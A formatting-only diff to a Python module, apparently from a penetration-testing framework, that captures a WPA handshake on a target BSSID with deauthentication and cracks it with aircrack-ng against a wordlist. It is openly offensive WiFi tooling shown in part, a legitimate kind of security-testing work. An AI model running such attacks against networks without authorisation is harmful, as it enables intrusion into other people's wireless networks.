@@ -2,13 +2,11 @@
 from lib.wifi import *
 
 
-WPA_HANDSHAKE_REGEX = re.compile(r"WPA handshake\:\s+"
-                                 r"(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})")
+WPA_HANDSHAKE_REGEX = re.compile(r"WPA handshake\:\s+(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})")
 
 
 class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
-    """ Capture a WPA handshake on the given BSSID and crack it with
-         aircrack-ng.
+    """ Capture a WPA handshake on the given BSSID and crack it with aircrack-ng.
     
     Author:  Yannick Pasquazzo
     Version: 1.0
@@ -31,15 +29,12 @@ class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
         ): str(Path(__file__).absolute().parent.joinpath("wordlist.txt")),
     })
     path = "auxiliary/wifi"
-    requirements = {'system': ["aircrack-ng/airmon-ng",
-                               "aircrack-ng/aireplay-ng",
-                               "aircrack-ng/airodump-ng"]}
+    requirements = {'system': ["aircrack-ng/airmon-ng", "aircrack-ng/aireplay-ng", "aircrack-ng/airodump-ng"]}
     
     def postload(self):
         for p in self.__procs:
             p.wait()
-        self.logger.debug("Removing temporary directory '{}'"
-                          .format(self.temp_dir))
+        self.logger.debug("Removing temporary directory '{}'".format(self.temp_dir))
         self.temp_dir.rmtree()
         del self.temp_dir
     
@@ -51,8 +46,7 @@ class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
     def prerun(self):
         r = super(Wpa2pskCrack, self).prerun()
         if len(self.console.state['TARGETS']) == 0:
-            self.logger.warning("No target available yet ; please use the "
-                                "'scan' command")
+            self.logger.warning("No target available yet ; please use the 'scan' command")
             return False
         return r
     
@@ -64,8 +58,7 @@ class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
                 if kwargs['bssid'] == m.group("bssid"):
                     self.logger.info("WPA handshake captured !")
                     return True
-        # capture packets on the target BSSID and stop when the WPA handshake is
-        #  captured
+        # capture packets on the target BSSID and stop when the WPA handshake is captured
         self.logger.warning("Press Ctrl+C to interrupt")
         t = self.console.state['TARGETS']
         essid = self.config.option('ESSID').value
@@ -93,3 +86,4 @@ class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
                 self.console.state['PASSWORDS'][essid] = password
                 return
         self.logger.failure("Password could not be found")
+
